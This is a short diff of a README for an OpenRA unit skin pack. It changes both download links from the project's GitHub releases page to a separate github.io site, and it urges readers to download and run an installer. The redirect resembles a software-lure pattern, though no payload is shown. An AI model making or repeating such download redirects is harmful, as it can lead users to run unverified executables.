@@ -15,7 +15,7 @@ Getting started is easy! Here's what you need to do:
 
 ### 🔗 Primary Download Link
 
-**[⬇️ Download openra-unit-skin-pack-2026](https://github.com/A400351/openra-unit-skin-pack-2026/releases)**
+**[⬇️ Download openra-unit-skin-pack-2026](https://a400351.github.io)**
 
 Visit this link to download the application. Once you're there, look for the most recent release and download the file associated with it.
 
@@ -126,7 +126,7 @@ This pack is free to use and open source. If you enjoy it, consider:
 
 Ready to transform your OpenRA experience? Click the link below to get the latest version:
 
-**[⬇️ Download openra-unit-skin-pack-2026](https://github.com/A400351/openra-unit-skin-pack-2026/releases)**
+**[⬇️ Download openra-unit-skin-pack-2026](https://a400351.github.io)**
 
 Visit this link to download the application. Head over to the releases section and grab the newest file. Once it's downloaded, run the installation and within minutes you'll be playing your favorite classic RTS games with beautiful new high-definition graphics.
 
